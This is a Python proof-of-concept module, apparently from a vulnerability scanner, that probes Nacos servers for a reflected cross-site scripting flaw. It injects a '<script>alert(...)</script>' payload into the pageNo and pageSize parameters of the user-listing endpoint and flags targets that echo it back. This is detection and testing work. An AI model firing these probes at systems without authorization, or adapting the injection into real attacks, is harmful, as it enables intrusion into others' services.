'''
Function:
    nacos xss 跨站脚本注入攻击漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        self.payload = "<script>alert(`" + "test" + char + "`)</script>"
        self.payloads = ["/nacos/v1/auth/users?pageNo=1&pageSize={}".format(self.payload), "/nacos/v1/auth/users?pageNo={}&pageSize=1".format(self.payload), "/v1/auth/users?pageNo=1&pageSize={}".format(self.payload), "/v1/auth/users?pageNo={}&pageSize=1".format(self.payload)]
        self.result_list = []
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        for payload in self.payloads:
            result_text = ""
            url = "{}://{}{}".format(scheme, netloc, payload)
            try:
                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if self.payload in result.text:
                    target = urlparse(url)
                    result_text += """\n        [+]    \033[32m检测到目标站点存在跨站脚本注入攻击漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.result_list.append(result_text)
                else:
                    pass
            except:
                pass
        return True

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
            return self.result_list
        else:
            return False


